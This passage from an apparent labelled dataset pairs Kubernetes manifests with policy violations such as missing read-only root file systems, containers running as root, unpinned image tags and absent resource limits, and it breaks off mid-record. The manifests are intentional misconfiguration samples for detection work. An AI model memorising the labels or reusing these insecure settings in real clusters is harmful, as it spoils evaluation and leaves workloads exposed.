JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 60d2f020b3003672ecbc8c9abd2f3cf20344fee2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-foghorn\" does not have a read-only root file system"
  },
  {
    "id": "01295",
    "manifest_path": "data/manifests/the_stack_sample/sample_0376.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.3.1\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: 4680350d90b15cd48f3a8504bff0c968752ad64ad3080e746113158aa5eb44b3\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.3.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: pa.gigante\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.3.1\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 60d2f020b3003672ecbc8c9abd2f3cf20344fee2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-foghorn\" is not set to runAsNonRoot"
  },
  {
    "id": "01296",
    "manifest_path": "data/manifests/the_stack_sample/sample_0377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: newacrname.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"captureorder\" does not have a read-only root file system"
  },
  {
    "id": "01297",
    "manifest_path": "data/manifests/the_stack_sample/sample_0377.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: newacrname.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"captureorder\" is not set to runAsNonRoot"
  },
  {
    "id": "01298",
    "manifest_path": "data/manifests/the_stack_sample/sample_0378.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01299",
    "manifest_path": "data/manifests/the_stack_sample/sample_0378.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01300",
    "manifest_path": "data/manifests/the_stack_sample/sample_0378.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01301",
    "manifest_path": "data/manifests/the_stack_sample/sample_0378.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01302",
    "manifest_path": "data/manifests/the_stack_sample/sample_0378.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01303",
    "manifest_path": "data/manifests/the_stack_sample/sample_0379.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: hello\n          image: busybox:1.28\n          imagePullPolicy: IfNotPresent\n          command:\n          - /bin/sh\n          - -c\n          - date; echo Hello from the Kubernetes cluster\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hello\" does not have a read-only root file system"
  },
  {
    "id": "01304",
    "manifest_path": "data/manifests/the_stack_sample/sample_0379.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: hello\n          image: busybox:1.28\n          imagePullPolicy: IfNotPresent\n          command:\n          - /bin/sh\n          - -c\n          - date; echo Hello from the Kubernetes cluster\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hello\" is not set to runAsNonRoot"
  },
  {
    "id": "01305",
    "manifest_path": "data/manifests/the_stack_sample/sample_0379.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: hello\n          image: busybox:1.28\n          imagePullPolicy: IfNotPresent\n          command:\n          - /bin/sh\n          - -c\n          - date; echo Hello from the Kubernetes cluster\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hello\" has cpu request 0"
  },
  {
    "id": "01306",
    "manifest_path": "data/manifests/the_stack_sample/sample_0379.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: hello\n          image: busybox:1.28\n          imagePullPolicy: IfNotPresent\n          command:\n          - /bin/sh\n          - -c\n          - date; echo Hello from the Kubernetes cluster\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hello\" has memory limit 0"
  },
  {
    "id": "01307",
    "manifest_path": "data/manifests/the_stack_sample/sample_0381.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"fio\" is using an invalid container image, \"nixery.dev/shell/fio/tini\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01308",
    "manifest_path": "data/manifests/the_stack_sample/sample_0381.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fio\" does not have a read-only root file system"
  },
  {
    "id": "01309",
    "manifest_path": "data/manifests/the_stack_sample/sample_0381.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fio\" is not set to runAsNonRoot"
  },
  {
    "id": "01310",
    "manifest_path": "data/manifests/the_stack_sample/sample_0381.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fio\" has cpu request 0"
  },
  {
    "id": "01311",
    "manifest_path": "data/manifests/the_stack_sample/sample_0381.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fio\" has memory limit 0"
  },
  {
    "id": "01312",
    "manifest_path": "data/manifests/the_stack_sample/sample_0386.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cos\n  labels:\n    app.kubernetes.io/component: cos\n    app.kubernetes.io/instance: cos\n    app.kubernetes.io/name: cos\n    app.kubernetes.io/part-of: cos\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: cos\n      app.kubernetes.io/instance: cos\n      app.kubernetes.io/name: cos\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: cos\n        app.kubernetes.io/instance: cos\n        app.kubernetes.io/name: cos\n    spec:\n      containers:\n      - image: nginx:1.20-alpine\n        name: cos\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 100m\n            memory: 256Mi\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 80\n          failureThreshold: 30\n          periodSeconds: 5\n          initialDelaySeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /index.html\n            port: 80\n          failureThreshold: 30\n          periodSeconds: 5\n          initialDelaySeconds: 10\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cos\" does not have a read-only root file system"
  },
  {
    "id": "01313",
    "manifest_path": "data/manifests/the_stack_sample/sample_0386.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cos\n  labels:\n    app.kubernetes.io/component: cos\n    app.kubernetes.io/instance: cos\n    app.kubernetes.io/name: cos\n    app.kubernetes.io/part-of: cos\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: cos\n      app.kubernetes.io/instance: cos\n      app.kubernetes.io/name: cos\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: cos\n        app.kubernetes.io/instance: cos\n        app.kubernetes.io/name: cos\n    spec:\n      containers:\n      - image: nginx:1.20-alpine\n        name: cos\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 100m\n            memory: 256Mi\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 80\n          failureThreshold: 30\n          periodSeconds: 5\n          initialDelaySeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /index.html\n            port: 80\n          failureThreshold: 30\n          periodSeconds: 5\n          initialDelaySeconds: 10\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cos\" is not set to runAsNonRoot"
  },
  {
    "id": "01314",
    "manifest_path": "data/manifests/the_stack_sample/sample_0394.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: test-job\n  labels:\n    app: service1\nspec:\n  template:\n    metadata:\n      name: test-job\n    spec:\n      containers:\n      - name: test-container\n        image: gcr.io/google_containers/busybox\n        command:\n        - /bin/sh\n        - -c\n        - sleep 10; env\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"test-container\" is using an invalid container image, \"gcr.io/google_containers/busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01315",
    "manifest_path": "data/manifests/the_stack_sample/sample_0394.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: test-job\n  labels:\n    app: service1\nspec:\n  template:\n    metadata:\n      name: test-job\n    spec:\n      containers:\n      - name: test-container\n        image: gcr.io/google_containers/busybox\n        command:\n        - /bin/sh\n        - -c\n        - sleep 10; env\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"test-container\" does not have a read-only root file system"
  },
  {
    "id": "01316",
    "manifest_path": "data/manifests/the_stack_sample/sample_0394.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: test-job\n  labels:\n    app: service1\nspec:\n  template:\n    metadata:\n      name: test-job\n    spec:\n      containers:\n      - name: test-container\n        image: gcr.io/google_containers/busybox\n        command:\n        - /bin/sh\n        - -c\n        - sleep 10; env\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"test-container\" is not set to runAsNonRoot"
  },
  {
    "id": "01317",
    "manifest_path": "data/manifests/the_stack_sample/sample_0394.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: test-job\n  labels:\n    app: service1\nspec:\n  template:\n    metadata:\n      name: test-job\n    spec:\n      containers:\n      - name: test-container\n        image: gcr.io/google_containers/busybox\n        command:\n        - /bin/sh\n        - -c\n        - sleep 10; env\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"test-container\" has cpu request 0"
  },
  {
    "id": "01318",
    "manifest_path": "data/manifests/the_stack_sample/sample_0394.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: test-job\n  labels:\n    app: service1\nspec:\n  template:\n    metadata:\n      name: test-job\n    spec:\n      containers:\n      - name: test-container\n        image: gcr.io/google_containers/busybox\n        command:\n        - /bin/sh\n        - -c\n        - sleep 10; env\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"test-container\" has memory limit 0"
  },
  {
    "id": "01319",
    "manifest_path": "data/manifests/the_stack_sample/sample_0396.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210427-e4ab4d8c8f\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sinker\" does not have a read-only root file system"
  },
  {
    "id": "01320",
    "manifest_path": "data/manifests/the_stack_sample/sample_0396.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210427-e4ab4d8c8f\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sinker\" is not set to runAsNonRoot"
  },
  {
    "id": "01321",
    "manifest_path": "data/manifests/the_stack_sample/sample_0396.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210427-e4ab4d8c8f\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sinker\" has cpu request 0"
  },
  {
    "id": "01322",
    "manifest_path": "data/manifests/the_stack_sample/sample_0396.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210427-e4ab4d8c8f\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sinker\" has memory limit 0"
  },
  {
    "id": "01323",
    "manifest_path": "data/manifests/the_stack_sample/sample_0397.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: additional-pod\n  labels:\n    tier: pkad-rs\nspec:\n  containers:\n  - name: additional-pkad\n    image: poznajkubernetes/pkad:blue\n    resources:\n      limits:\n        memory: 128Mi\n        cpu: 500m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"additional-pkad\" does not have a read-only root file system"
  },
  {
    "id": "01324",
    "manifest_path": "data/manifests/the_stack_sample/sample_0397.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: additional-pod\n  labels:\n    tier: pkad-rs\nspec:\n  containers:\n  - name: additional-pkad\n    image: poznajkubernetes/pkad:blue\n    resources:\n      limits:\n        memory: 128Mi\n        cpu: 500m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"additional-pkad\" is not set to runAsNonRoot"
  },
  {
    "id": "01325",
    "manifest_path": "data/manifests/the_stack_sample/sample_0397.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: additional-pod\n  labels:\n    tier: pkad-rs\nspec:\n  containers:\n  - name: additional-pkad\n    image: poznajkubernetes/pkad:blue\n    resources:\n      limits:\n        memory: 128Mi\n        cpu: 500m\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"additional-pkad\" has cpu request 0"
  },
  {
    "id": "01326",
    "manifest_path": "data/manifests/the_stack_sample/sample_0399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:latest\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"server\" is using an invalid container image, \"ubuntu:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01327",
    "manifest_path": "data/manifests/the_stack_sample/sample_0399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:latest\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "01328",
    "manifest_path": "data/manifests/the_stack_sample/sample_0399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:latest\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "01329",
    "manifest_path": "data/manifests/the_stack_sample/sample_0399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:latest\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "01330",
    "manifest_path": "data/manifests/the_stack_sample/sample_0399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:latest\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "01331",
    "manifest_path": "data/manifests/the_stack_sample/sample_0404.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\n    env: dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: dev\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01332",
    "manifest_path": "data/manifests/the_stack_sample/sample_0404.yaml",
